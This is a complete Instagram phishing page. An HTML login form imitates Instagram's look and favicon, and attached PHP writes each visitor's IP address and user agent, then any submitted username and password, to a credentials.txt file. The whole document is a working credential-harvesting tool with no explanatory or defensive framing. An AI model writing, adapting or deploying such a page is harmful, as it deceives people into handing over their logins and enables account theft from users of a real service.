<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>
<link rel="icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
<style>
  body {
    font-family: Arial, sans-serif;
    background-color: #fafafa;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }

  .container {
    background-color: white;
    border: 1px solid #dbdbdb;
    border-radius: 4px;
    padding: 20px;
    width: 300px;
    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
  }

  input {
    width: 100%;
    padding: 10px;
    margin: 8px 0;
    border: 1px solid #dbdbdb;
    border-radius: 4px;
  }

  button {
    width: 100%;
    padding: 10px;
    background-color: #3897f0;
    color: white;
    border: none;
    border-radius: 4px;
    font-weight: bold;
    cursor: pointer;
  }
</style>
</head>
<body>
<div class="container">
  <form action="" method="post">
	<img src="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico" alt="Logo" class="logo">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Login</button>
	<div class="signup-link">
		Don't have an account? <a href="http://instagram.com">Sign up</a>
	</div>
  </form>
</div>
</body>
</html>

<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
{
  $ip = $_SERVER['HTTP_CLIENT_IP']."\r\n";
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
  $ip = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
}
else
{
  $ip = $_SERVER['REMOTE_ADDR']."\r\n";
}
$useragent = $_SERVER['HTTP_USER_AGENT'];

$filename = "../credentials.txt";

$data = "|-------------------INSTAGRAM-------------------|\n" . "User-Agent: " . $useragent . "\n" . "IP: " . $ip . "\n";    
file_put_contents($filename, $data, FILE_APPEND);   

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    $data = "User: " . $username . "\n" . "Password: " . $password . "\n|-------------------INSTAGRAM-------------------|\n";    
    file_put_contents($filename, $data, FILE_APPEND);   
}
?>
